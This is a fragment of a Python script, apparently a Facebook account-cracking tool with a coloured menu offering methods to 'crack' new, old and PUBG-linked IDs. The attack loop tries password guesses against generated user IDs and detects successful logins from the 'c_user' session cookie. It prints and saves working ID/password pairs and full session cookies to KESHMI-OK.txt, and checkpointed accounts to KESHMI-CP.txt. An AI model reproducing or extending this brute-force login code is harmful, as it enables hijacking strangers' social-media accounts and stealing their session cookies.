...
\033[1;97m====================================================
[+] AUTHOR    : FARAMOZ-123
[+] FACEBOOK  : FARAMOZ JAN KESHMI
[+] TOOLS     : FREE
[+] VERSION   : \033[1;92m0.3
\033[1;97m[+]\033[1;91m THANKS FORM AFGHAN TECH TM
\033[1;97m====================================================""")  
def lines():
	print('\033[1;97m====================================================')
...
def riaz():
	...
	if riaz1 =='0':
		exit()
	if riaz1 =='3':
		os.system('xdg-open https://youtube.com/@Zabiuhallh')
	else:
...
def afg():
    os.system('clear')
    print(logo)
    print('\33[1;97m[1] METHOD 1_\33[1;36mCRACK MIX IDS  ')
    print('\33[1;97m[2] METHOD 2_\33[1;36mCRACK NEW IDS ')            
    print('\33[1;37m[3] METHOD 3_\33[1;36mCRACK OLD AND PUBG ID')
    print('\33[1;37m[4] \x1b[1;91mBACK MENU ')
    lines()
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('\33[1;31m CHOOSE CODE : 9370, 9379, 9378, 9377, 9374')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[KESHMI -OK] '+cid+' | '+ps+'\033[0;97m\n[]\033[0;37m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('KESHMI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[KESHMI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('KESHMI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mKESHMI\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
